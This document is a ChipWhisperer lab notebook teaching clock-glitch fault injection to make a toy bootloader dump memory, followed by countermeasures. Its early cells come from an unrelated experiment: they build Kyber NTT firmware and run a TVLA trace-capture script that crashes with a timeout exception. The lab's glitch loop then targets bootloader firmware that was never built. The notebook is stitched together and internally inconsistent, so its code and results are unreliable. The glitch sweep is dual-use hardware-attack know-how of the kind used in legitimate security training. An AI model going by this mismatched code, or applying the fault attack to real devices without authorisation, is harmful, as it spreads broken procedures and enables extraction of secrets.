# Part 1, Topic 3: Clock Glitching to Dump Memory (MAIN)

---
NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.

---

**SUMMARY:** *In the previous lab, we learned how clock glitching can be used to get a microcontroller to skip a password check. This time, we'll look at a more practical example: getting an example bootloader to dump a large chunk of memory.*

**LEARNING OUTCOMES:**

* Applying previous glitch settings to new firmware
* Checking for success and failure when glitching
* Understanding how compiler optimizations can cause devices to behave in strange ways

## The Situation

Now that we've got our feet wet with glitching, we're going to try something a bit more realistic: an "encrypted" bootloader (it's actually just rot-13, but we'll pretend it's unbreakable encryption), where we make as few assumptions as possible. Our goal will be to get that bootloader to decrypt the data and send it back to us. Here's what we know about the bootloader:

1. The `'p'` command is used to write encrypted firmware to the device. It takes in an encrypted ASCII-encoded string, terminated with a newline. Our first chunk of firmware is `"516261276720736265747267206762206f686c207a76797821"`.
1. It does *something* to it (presumably unencrypts it, authenticates it, etc. and writes it to memory)
1. It sends back an error code of `"r000000\n"`

Of immediate interest is that error code. That's the only time the bootloader communicates back with us, so attacking there is a good place to start. One thing that we'll assume is that we've got a trigger right before the error code is sent back to us. This is just a simple `trigger_high()` call, but we could also trigger on an IO line (better with the CW1200 Pro) or with a SAD trigger on a power trace (CW1200 Pro only). We've got a place to start, but let's see if we can learn more about the bootloader first.

We recommend using SimpleSerial V2 for this as, though the firmware doesn't use the simpleserial protocol, the faster baud rate will help speed up glitching.

In [1]:
SCOPETYPE = 'OPENADC'
CRYPTO_TARGET = 'NONE'
PLATFORM = 'CW308_STM32F4'
SS_VER="SS_VER_2_1"

In [2]:
%%bash -s "$PLATFORM" "$SS_VER"
cd ../../../firmware/mcu/simpleserial-ntt
make PLATFORM=$1 CRYPTO_TARGET=NONE -j SS_VER=$2

SS_VER set to SS_VER_2_1
SS_VER set to SS_VER_2_1
.
.
+--------------------------------------------------------
Welcome to another exciting ChipWhisperer target build!!
Compiling:
+ Built for platform CW308T: STM32F4 Target with:
    simpleserial-ntt.c ...+ CRYPTO_TARGET = NONE
arm-none-eabi-gcc (Arm GNU Toolchain 13.3.Rel1 (Build arm-13.24)) 13.3.1 20240614
Copyright (C) 2023 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

+ CRYPTO_OPTIONS = AES128C
+--------------------------------------------------------


simpleserial-ntt.c: In function 'get_pt':
simpleserial-ntt.c:42:18: warning: array subscript 256 is above array bounds of 'int16_t[256]' {aka 'short int[256]'} [-Warray-bounds=]
   42 |         r->coeffs[KYBER_N] = (int16_t) rand();
      |         ~~~~~~~~~^~~~~~~~~
In file included from simpleserial-ntt.c:20:
ntt.h:12:11: note: while referencing 'coeffs'
   12 |   int16_t coeffs[KYBER_N];
      |           ^~~~~~


Done!
.
LINKING:


/usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/bin/ld: /usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg.a(libc_a-closer.o): in function `_close_r':
closer.c:(.text._close_r+0xc): warning: _close is not implemented and will always fail
/usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/bin/ld: /usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg.a(libc_a-lseekr.o): in function `_lseek_r':
lseekr.c:(.text._lseek_r+0x14): warning: _lseek is not implemented and will always fail
/usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/bin/ld: /usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg.a(libc_a-readr.o): in function `_read_r':
readr.c:(.text._read_r+0x14): warning: _read is not implemented and will always fail


    simpleserial-ntt-CW308_STM32F4.elf .../usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/bin/ld: /usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg.a(libc_a-closer.o): note: the message above does not take linker garbage collection into account
/usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/bin/ld: /usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg.a(libc_a-lseekr.o): note: the message above does not take linker garbage collection into account
/usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/bin/ld: /usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg.a(libc_a-readr.o): note: the message above does not take linker garbage collection into account


/usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/bin/ld: /usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg.a(libc_a-writer.o): in function `_write_r':
writer.c:(.text._write_r+0x14): warning: _write is not implemented and will always fail


/usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/bin/ld: /usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/lib/thumb/v7e-m/nofp/libg.a(libc_a-writer.o): note: the message above does not take linker garbage collection into account


/usr/bin/../lib/gcc/arm-none-eabi/13.3.1/../../../../arm-none-eabi/bin/ld: warning: simpleserial-ntt-CW308_STM32F4.elf has a LOAD segment with RWX permissions


Done!
.
.
.
.
Creating load file for Flash: simpleserial-ntt-CW308_STM32F4.hex
arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature simpleserial-ntt-CW308_STM32F4.elf simpleserial-ntt-CW308_STM32F4.hex
Creating load file for Flash: simpleserial-ntt-CW308_STM32F4.bin
.
arm-none-eabi-objcopy -O binary -R .eeprom -R .fuse -R .lock -R .signature simpleserial-ntt-CW308_STM32F4.elf simpleserial-ntt-CW308_STM32F4.bin
Creating load file for EEPROM: simpleserial-ntt-CW308_STM32F4.eep
Creating Extended Listing: simpleserial-ntt-CW308_STM32F4.lss
arm-none-eabi-objdump -h -S -z simpleserial-ntt-CW308_STM32F4.elf > simpleserial-ntt-CW308_STM32F4.lss
arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
--change-section-lma .eeprom=0 --no-change-warnings -O ihex simpleserial-ntt-CW308_STM32F4.elf simpleserial-ntt-CW308_STM32F4.eep || exit 0
Creating Symbol Table: simpleserial-ntt-CW308_STM32F4.sym
arm-none-eabi-nm -n simpleserial-ntt-CW308_STM32F4.elf > simp

In [3]:
%run "../../Setup_Scripts/Setup_Generic.ipynb"

INFO: Found ChipWhisperer😍
scope.gain.mode                          changed from low                       to high                     
scope.gain.gain                          changed from 0                         to 30                       
scope.gain.db                            changed from 5.5                       to 24.8359375               
scope.adc.basic_mode                     changed from low                       to rising_edge              
scope.adc.samples                        changed from 24400                     to 5000                     
scope.adc.trig_count                     changed from 12811491                  to 40222458                 
scope.clock.adc_src                      changed from clkgen_x1                 to clkgen_x4                
scope.clock.adc_freq                     changed from 0                         to 29538459                 
scope.clock.adc_rate                     changed from 0.0                       to 29538459.0        

In [4]:
fw_path = "../../../firmware/mcu/simpleserial-ntt/simpleserial-ntt-CW308_STM32F4.hex"

In [5]:
cw.program_target(scope, prog, fw_path)

Detected known STMF32: STM32F40xxx/41xxx
Extended erase (0x44), this can take ten seconds or more
Attempting to program 5051 bytes at 0x8000000
STM32F Programming flash...
STM32F Reading flash...
Verified flash OK, 5051 bytes


In [8]:
from tqdm.notebook import trange
import numpy as np
import time

ktp = cw.ktp.Basic()
trace_array = []
textin_array = []

key, text = ktp.next()

target.set_key(key)

N = 2500 #100#2500
for i in trange(N, desc='Capturing traces'):
    scope.arm()

    target.simpleserial_write('p', text)

    ret = scope.capture()
    if ret:
        print("Target timed out!")
        continue

    response = target.simpleserial_read('r', 16)

    trace_array.append(scope.get_last_trace())
    textin_array.append(text)

    key, text = ktp.next()

Capturing traces:   0%|          | 0/2500 [00:00<?, ?it/s]

In [9]:
cw.plot(trace_array[0]) #* cw.plot(trace_array[1])

:Curve   [x]   (y)

In [16]:
import numpy as np

class IncrementalStats:
    def __init__(self):
        self.n = 0
        self.mean = None  # Start with None to handle dynamic sizes
        self.sum_sq = None
        self.variance = None

    def add_trace(self, trace):
        trace_length = len(trace)
        if self.mean is None:
            # Initialize the arrays dynamically based on the first trace length
            self.mean = np.zeros(trace_length)
            self.sum_sq = np.zeros(trace_length)
            self.variance = np.zeros(trace_length)
        elif trace_length != len(self.mean):
            # Adjust the existing arrays to accommodate a trace of new length
            # This case handles if the new trace length is shorter or longer
            if trace_length > len(self.mean):
                # Extend arrays with zeros if new trace is longer
                extension = np.zeros(trace_length - len(self.mean))
                self.mean = np.concatenate((self.mean, extension))
                self.sum_sq = np.concatenate((self.sum_sq, extension))
                self.variance = np.concatenate((self.variance, extension))
            else:
                # If new trace is shorter, use slicing to adjust
                self.mean = self.mean[:trace_length]
                self.sum_sq = self.sum_sq[:trace_length]
                self.variance = self.variance[:trace_length]

        self.n += 1
        delta = trace - self.mean
        self.mean += delta / self.n
        self.sum_sq += trace**2
        if self.n > 1:
            self.variance = (self.sum_sq - self.n * self.mean**2) / (self.n - 1)
        else:
            self.variance = np.zeros_like(self.variance)  # Variance is undefined for n=1

    def get_stats(self):
        return self.mean, self.variance


In [17]:
import time
%matplotlib inline
import matplotlib.pyplot as plt
from math import sqrt
import struct
import scipy # 1.13.0
import numpy as np #1.26.4
import json
import os
from scipy.io import loadmat


def mean(data):
    """
        Calculate the mean of the input data along the specified axis.

        Parameters:
            data (array-like): Input data for which the mean is calculated.

        Returns:
            numpy.ndarray: Mean of the input data.
    """
    return np.mean(data, axis=0)

def variance(data):
    """
        Calculate the variance of the input data along the specified axis.

        Parameters:
            data (array-like): Input data for which the variance is calculated.

        Returns:
            numpy.ndarray: Variance of the input data.
    """
    return np.var(data, axis=0, ddof=1)


def ttest_ind_2d(sample1, sample2):
    """
        Perform a 2D t-test on two independent samples.

        Parameters:
            sample1 (array-like): First sample data.
            sample2 (array-like): Second sample data.

        Returns:
            numpy.ndarray: T-statistic values.
    """
    sample1 = np.array(sample1)
    sample2 = np.array(sample2)

    # Find the minimum number of columns in both samples
    min_columns = min(sample1.shape[1], sample2.shape[1])

    # Resize both samples to the smallest number of columns
    sample1 = sample1[:, :min_columns]
    sample2 = sample2[:, :min_columns]


    mean1, mean2 = mean(sample1), mean(sample2)
    var1, var2 = variance(sample1), variance(sample2)
    n1, n2 = sample1.shape[0], sample2.shape[0]

    pooled_se = np.sqrt(var1/n1 + var2/n2)

    t_stat = (mean1 - mean2) / pooled_se
    return t_stat


def reset_target(scope):
    """
    Reset the target device by toggling the reset pin.

    Parameters:
        scope: ChipWhisperer scope object to control the hardware.
    """
    scope.io.nrst = 'low'
    time.sleep(0.05)
    scope.io.nrst = 'high'
    time.sleep(0.05)

def cap_pass_trace(num, nr, arr, i):
    """
    Capture and pass a trace from the target device.

    Parameters:
        num (int): Number to write to the target.
        nr (int): Number of repetitions.
        arr (list): Array to store the captured trace.
        i (int): Index for storing the trace.

    Returns:
        numpy.ndarray: Captured trace data.

    Raises:
        Exception: If a timeout occurs during acquisition.
    """
    scope.arm()
    target.write(num)
    if not scope.capture():
        trace = scope.get_last_trace()
        arr[i][:] = trace
        if nr == 1:
            plt.plot(trace[0:100])
        return trace
    else:
        print('Timeout happened during acquisition')
        raise Exception("Error occurred in function_deep")



def send_string(s):
    """
    Send a string to the target device, character by character.

    Parameters:
        s (str): String to send to the target.
    """
    for c in s:
        target.write(c.encode())

def parser(flag_string, max_no_traces, arr_trace_ct, inc_stats_ct, nr):
    """
    Parse and capture traces from the target device.

    Parameters:
        flag_string (str): String containing flags for the target.
        max_no_traces (int): Maximum number of traces to capture.
        arr (list): Array to store the captured traces.
        inc_stats: Incremental statistics object to update with new traces.
        nr (int): Number of repetitions.
    """
    send_string(f"{flag_string}")

    recv_byte = 's'; #start
    for i in range (max_no_traces):
        if (recv_byte == 's' or recv_byte == 'd'):  # Start ('s') or Done ('d') with the current trace
            trace = cap_pass_trace(b'g', nr, arr_trace_ct, i)
            inc_stats_ct.add_trace(trace)
            time.sleep(0.1)
            recv_byte = target.read(1)
            while (recv_byte == ""):  #Different implementations have different processing times
                time.sleep(0.1)
                recv_byte = target.read(1)
            if (i % 50 == 0):
                print(f"Recv byte: {recv_byte}")
    target.write(b'e')


def run_program(inc_stats_same_ct, inc_stats_random_ct, inc_stats, run_i, max_no_traces, flag_string, samples_max, samples_left, total_trace_segments, traces_per_seg, output_directory):
    """
    Run the main program for capturing and analyzing traces from the target device.

    Parameters:
        inc_stats_same_ct: Incremental statistics object for same ciphertext traces.
        inc_stats_random_ct: Incremental statistics object for random ciphertext traces.
        inc_stats: Incremental statistics object for the combined statistics.
        run_i (int): Current run index.
        max_no_traces (int): Maximum number of traces to capture.
        flag_string (str): String containing flags for the target.
        samples_max (int): Maximum number of samples per trace.
        samples_left (int): Number of samples left to capture.
        total_trace_segments (int): Total number of trace segments.
        traces_per_seg (int): Number of traces per segment.
        output_directory (str): Output directory name for saving trace data.
    """
    run_offset = run_i * scope.adc.samples
    scope.adc.offset = run_offset

    scope.adc.samples = min(scope.adc.samples, samples_left)

    arr_trace_same_ct = [[0 for i in range(scope.adc.samples)] for j in range(max_no_traces)]
    arr_trace_random_ct = [[0 for i in range(scope.adc.samples)] for j in range(max_no_traces)]

    parser(f"{flag_string}", max_no_traces, arr_trace_same_ct, inc_stats_same_ct, run_i)
    print(f"Finished Same CT Test Segment: {run_i}")

    parser(f"{flag_string}fw", max_no_traces, arr_trace_random_ct, inc_stats_random_ct, run_i)
    print(f"Finished Random CT Test Segment: {run_i}")



    # Assume stats1 and stats2 are instances of IncrementalStats for group 1 and group 2
    mean1, var1 = inc_stats_same_ct.get_stats()
    mean2, var2 = inc_stats_random_ct.get_stats()
    n1 = inc_stats_same_ct.n
    n2 = inc_stats_random_ct.n

    # Compute the t-statistic for each point
    pooled_se = np.sqrt(var1 / n1 + var2 / n2)
    inc_values = (mean1 - mean2) / pooled_se

    inc_stats[run_offset:run_offset+scope.adc.samples] = inc_values

    count = 0
    for stat in inc_stats[run_offset:run_offset+scope.adc.samples]:
        if abs(stat) > 4.5:
#             print(stat)
            count += 1
    print(f"count inc seg {run_i}: {count}")



    # Create the initial directory, the loop creates the sub-directories
    os.makedirs(f"{output_directory}/{max_no_traces}_traces_{samples_max}_samples", exist_ok=True)

    for trace_seg_i in range(total_trace_segments):
        os.makedirs(f'{output_directory}/{max_no_traces}_traces_{samples_max}_samples/{run_i}_run_seg/{trace_seg_i}_trace_seg', exist_ok=True)

        trace_offset = trace_seg_i * traces_per_seg

        tmp_arr_same_ct = arr_trace_same_ct[trace_offset:trace_offset+traces_per_seg]
        scipy.io.savemat(f"{output_directory}/{max_no_traces}_traces_{samples_max}_samples/{run_i}_run_seg/{trace_seg_i}_trace_seg/same_ct_test_{samples_max}_{run_i}_{trace_seg_i}.mat", {"same_ct_test": tmp_arr_same_ct})

        tmp_arr_random_ct = arr_trace_random_ct[trace_offset:trace_offset+traces_per_seg]
        scipy.io.savemat(f"{output_directory}/{max_no_traces}_traces_{samples_max}_samples/{run_i}_run_seg/{trace_seg_i}_trace_seg/random_ct_test_{samples_max}_{run_i}_{trace_seg_i}.mat", {"random_ct_test": tmp_arr_random_ct})


    scipy.io.savemat(f"{output_directory}/{max_no_traces}_traces_{samples_max}_samples/tstats_{run_i}_{samples_max}.mat", {"tstats": inc_values})


In [18]:
def main():
    """
    Main test function to set parameters and run the trace capture and analysis.
    """

    #----------BEGIN FLAGS TO SET----------#
    max_no_traces = 1000
    total_trace_segments = 1
    scope.adc.samples = 24400
    flags = "l"
    output_directory = "traces_kyber_masked_sk"
    #----------END FLAGS TO SET------------#

    traces_per_seg = max_no_traces // total_trace_segments
    samples_max = scope.adc.samples
    scope.adc.offset = 0
    arr_offset = scope.adc.offset

    reset_target(scope)
    time.sleep(4)
    target.flush()

    flag_string = ""

    for f in flags:
        flag_string += f"f{f}"



    #Run it once to determine the trig_count
    inc_stats_trig = IncrementalStats()
    arr_0 = [[0 for i in range(samples_max)] for j in range(max_no_traces)]
    parser(f"{flag_string}", 1, arr_0, inc_stats_trig, 0)

    nr_runs_full_cap = (scope.adc.trig_count + samples_max - 1) // samples_max  # Round up without math lib
    print("Total trigger count for the capture: " + str(scope.adc.trig_count))
    print("Total number of runs that will be performed: " + str(nr_runs_full_cap))

    plt.clf()

    inc_stats = [0 for i in range(scope.adc.trig_count)]

    run_i = 0
    samples_left = scope.adc.trig_count   # Init samples_left as the total number of triggers

    while (run_i < nr_runs_full_cap):
        inc_stats_same_ct = IncrementalStats()
        inc_stats_random_ct = IncrementalStats()
        run_program(inc_stats_same_ct, inc_stats_random_ct, inc_stats, run_i, max_no_traces, flag_string, samples_max, samples_left, total_trace_segments, traces_per_seg, output_directory)
        samples_left -= samples_max
        run_i += 1


    target.write(b'm')
    plt.show()

    count = 0
    for stat in inc_stats:
        if abs(stat) > 4.5:
            count += 1
    print(f"count inc: {count}")

main()

(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:642) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 0b
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:642) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 08


Timeout happened during acquisition


Exception: Error occurred in function_deep

The first thing we'll do is some simple power analysis to see what the device is doing when it sends data back to us. Serial communication is pretty slow, so set the ChipWhisperer to capture around 24k samples with a "x1" ADC clock.

In [ ]:
def reboot_flush():            
    reset_target(scope)
    #Flush garbage too
    target.flush()
scope.clock.adc_src = "clkgen_x1"
reboot_flush()
scope.adc.samples = 24000

Next, capture a power trace. The string `"p516261276720736265747267206762206f686c207a76797821\n"` will send the bootloader the first chunk of code and plot it. If you don't see the full serial message, you can increase `scope.adc.decimate`, which will throw out every nth ADC sample.

In [ ]:
scope.adc.timeout = 3
scope.arm()
target.write("p516261276720736265747267206762206f686c207a76797821\n")
ret = scope.capture()
if ret:
    print("Timeout")
trace = scope.get_last_trace()


cw.plot(trace)

It doesn't look like anything too crazy is going on here - it's probably just printing some characters in a loop. Some ideas:

* If we glitch at the beginning of the loop, we might be able to corrupt the loop length variable and get it to print some extra memory
* We might be able to corrupt the loop variable and get it to read past where it's supposed to

For SimpleSerial V2, this should be short enough that you can quickly loop through the entirety of the code. If your target isn't using SimpleSerial V2, you should instead select a range a bit (~1000 cycles) before the end of the loop. If this doesn't succeed, you can try going after the cycles at the beginning of the loop.

**HINT: The last part of the loop should be near the beginning of the last power spike.**

**HINT: If you're really stuck on where the serial print ends, you can find the time between the `trigger_high()` and `trigger_low()` call with `scope.adc.trig_count`.**

In [ ]:
trig_count = scope.adc.trig_count
print(trig_count)

In [ ]:
glitch_spots = [i for i in range(1)]
# ###################
# Add your code here
# ###################
#raise NotImplementedError("Add your code here, and delete this.")

# ###################
# START SOLUTION
# ###################
glitch_spots = list(range(trig_count - 2000, trig_count, 1))
if SS_VER == "SS_VER_2_1":
    glitch_spots = list(range(0, trig_count, 1))
elif PLATFORM == "CW308_SAM4S":
    glitch_spots = list(range(trig_count - 2300, trig_count-1800, 1))
elif PLATFORM == "CWLITEXMEGA":
    glitch_spots = list(range(9500, 9650, 1))
# ###################
# END SOLUTION
# ###################

In [ ]:
print(glitch_spots)

### Evaluating Success

Detecting whether our glitch was successful or not isn't quite as trivial as in the previous lab - we don't have a nice error return that the device calculates and sends back to us. One idea is that we can look for part of the string that we sent to the device: there isn't much time between us sending it and the error code being returned. With any luck the compiler will have placed both values close in memory.

Now the rest is up to you! Use what you learned in the previous lab to setup glitch settings and a glitch loop. Here's a few hints to make things easier:

1. Try to use a fairly small width and offset range since we'll need to scan ext_offset as well here. A total range of ~2-3 for each with 0.4 steps is a good range to aim for. These numbers are for CW-Lite/Pro; for CW-Husky, convert as per Fault 1_1.
1. Try looking for a part of the string we sent to the device to check for success.
1. You may want to forgo graphing or plot only successes/crashes if it makes things substantially slower - we're scanning a large range of glitch settings so we'll need all the speed we can get.

Set your glitch up here:

In [ ]:
scope.adc.timeout = 0.1

scope.cglitch_setup()

def my_print(text):
    for ch in text:
        if (ord(ch) > 31 and ord(ch) < 127) or ch == "\n": 
            print(ch, end='')
        else:
            print("0x{:02X}".format(ord(ch)), end='')
        print("", end='')

Again, we can use the glitch controller to make loop setup easier:

In [ ]:
gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset", "tries"])
gc.display_stats()

In [ ]:
x_bound = (-48, 48)
y_bound = (glitch_spots[0], glitch_spots[-1])
if scope._is_husky:
    x_bound = gc.set_range("width", 3900, 4500)
gc.glitch_plot(plotdots={"success":"+g", "reset":"xr", "normal":None}, x_bound=x_bound, y_bound=y_bound,
               x_index="width", y_index="ext_offset")

Finally, create a glitch loop. Don't forget to check all the different `glitch_spots` as well!

In [ ]:
scope.glitch.repeat = 1    
if scope._is_husky:
    gc.set_range("width", 3900, 4500)
    gc.set_range("offset", 2200, 2500)
    gc.set_range("ext_offset", glitch_spots[0], glitch_spots[-1])
    gc.set_global_step([100])
    gc.set_step("ext_offset", glitch_spots[1] - glitch_spots[0])
    gc.set_step("width", 100)
else:
    gc.set_global_step(0.4)
    if PLATFORM == "CWLITEXMEGA":
        gc.set_range("width", 46, 49.8)
        gc.set_range("offset", -46, -49.8)
    elif PLATFORM == "CW308_STM32F4":
        gc.set_range("width", 0.4, 10)
        gc.set_range("offset", 40, 49.8)
    elif PLATFORM == "CWLITEARM":
        gc.set_range("width", 0.8, 3.6)
        gc.set_range("offset", -4, -2)

gc.set_range("ext_offset", glitch_spots[0], glitch_spots[-1])
gc.set_step("ext_offset", glitch_spots[1] - glitch_spots[0])
gc.set_range("tries", 1, 1)
gc.set_step("tries", 1)
gc.set_step("ext_offset", 1)

broken = False
for glitch_setting in gc.glitch_values():
    scope.glitch.offset = glitch_setting[1]
    scope.glitch.width = glitch_setting[0]
    scope.glitch.ext_offset = glitch_setting[2]
    if broken:
        break
    if scope.adc.state:
        #print("Timeout, trigger still high!")
        gc.add("reset")
        #Device is slow to boot?
        reboot_flush()
        
    target.flush()
    scope.arm()
    target.write("p516261276720736265747267206762206f686c207a76797821\n")
    ret = scope.capture()
    if ret:
        #print('Timeout - no trigger')
        gc.add("reset")

        #Device is slow to boot?
        reboot_flush()
    else:
        time.sleep(0.05)
        output = target.read(timeout=2)
        if "767" in output:
            print("Glitched!\n\tExt offset: {}\n\tOffset: {}\n\tWidth: {}".format(scope.glitch.ext_offset, scope.glitch.offset, scope.glitch.width))
            gc.add("success")
            broken = True 
            for __ in range(500):
                num_char = target.in_waiting()
                if num_char:
                    my_print(output)
                    output = target.read(timeout=50)
            time.sleep(1)
            break
        else:
            gc.add("normal")

## Diagnosing the Fault

As you can see by the output, the bootloader has suffered a pretty catastrophic failure! Not only has it spilled the secret, it's also dumped a whole bunch more memory. For a real bootloader, there's probably some pretty juicy stuff in there like encryption keys or previously decrypted firmware. Let's start by taking a look at the C source code that sends the error code back:

```C
trigger_high();

int i;
for(i = 0; i < ascii_idx; i++)
{
    putch(ascii_buffer[i]);
}
trigger_low();
state = IDLE;
```

Nothing really looks too unusual here. Before we take a look at the assembly and figure out what went wrong, let's try to make some guesses:

* Maybe the glitch corrupted the `ascii_idx` variable
    * The glitch happened near the end of the loop. It's unlikely the end of loop counter would be reloaded during the loop
* Maybe we skipped the last `i < ascii_idx` check
    * The glitch caused **a lot** of memory to be dumped. If we just skipped the last check it **should** only print an extra character
* i is a signed integer: maybe we corrupted it into being a really large negative number.

That last one seems to be our best theory, so let's go with that.

## The Answer

Let's check the assembly for our booloader. No need to decompile the binary or recompile to assembly, since there's also a listing file created as part of the build process (`*.lss`). This file also contains C, so it makes it easy to search (try something like the `trigger_high()` call). You might notice that instead of doing a `less than or equal` or `less than` comparison like was in our C code, the compiler has instead inserted a `not equal` comparison instead! This means our original guess may not have been correct, as our assumption about what would happen if the last `i < ascii_idx` was skipped doesn't hold. In fact, it's a lot more likely that the last check was skipped (or i was set to some large value) than flipping a particular bit.

This is actually a pretty unexpected change for the compiler to make, espcially since `less than`, `greater than`, and `not equal` are nearly identical instructions in terms of implementation and have both the same instruction size and speed. This showcases an important fact: the C code that you write is not directly translated to assembly. It needs to go through the compiler first, which may drastically change the intended logic of the program.

Now that we know what happened, let's look at some ways to fix it.

### 1. Volatile variables

C includes a keyword for variables called `volatile`, which indicates that the variable may change between accesses and therefore should not have optimizations applied to it. A typical use case for `volatile` is for peripheral registers on embedded devices. It would be really bad, for example, if you were trying to wait for an IO pin to go high in your code, but the compiler decided it would be faster to only check it only once and assume it doesn't change!

Try replacing `int i = 0;` before the print look with `volatile int i = 0;`, recompile, and check the listing file. Is there any other unexpected changes? What about if you consider the use case above (i.e. if `i` was a register instead of a loop variable)? Is there any way the attack might still work? If so, how might you mitigate this?

### 2. Unrolling the loop

Another potential way of solving this issue would be to manually unroll the loop. The message being printed by the bootloader is a constant length of 7 characters, so we could instead write:

```C
int i;
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
```

In fact, this is something the compiler might do on its own to optimize the code, since unrolling a loop like this is faster than the loop version. It's not a good idea to blindly rely on this, however, since the compiler could choose not to make this optimization as well and might change it between builds.

### 3. Checking for invalid characters

Another thing to consider is that the message from the bootloader only has a limited range of characters that it prints. We could instead construct a "safe print" function that only prints newlines, `'r'` and ASCII digits (i.e. `'0'` to `'9'`):

```C
int safe_print(char c)
{
    if ((c == '\n') ||
       ((c >= '0') && (c <= '9')) ||
       (c == 'r')) {
        putch(c);
        return 0;
    }
    return -1; //uh oh!
}
```

It we went this route, it would be a good idea to make the error return a separate buffer with a bunch of null characters at the end.

### 4. More generic methods

More generic ways of defending against glitch attacks (memory guards, for example) are also discussed in the training slides.

In [ ]:
scope.dis()
target.dis()

In [ ]:
assert broken is True